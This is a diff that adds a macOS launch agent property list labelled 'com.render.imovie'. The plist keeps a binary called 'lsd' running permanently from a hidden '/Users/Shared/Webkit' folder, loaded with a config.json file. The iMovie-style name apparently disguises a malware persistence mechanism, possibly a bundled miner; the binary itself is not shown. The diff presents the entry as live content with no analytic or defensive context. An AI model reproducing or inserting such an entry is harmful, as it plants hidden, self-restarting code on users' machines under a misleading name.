@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.render.imovie</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/Users/Shared/Webkit/lsd</string>
+        <string>-c</string>
+        <string>/Users/Shared/Webkit/config.json</string>
+    </array>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
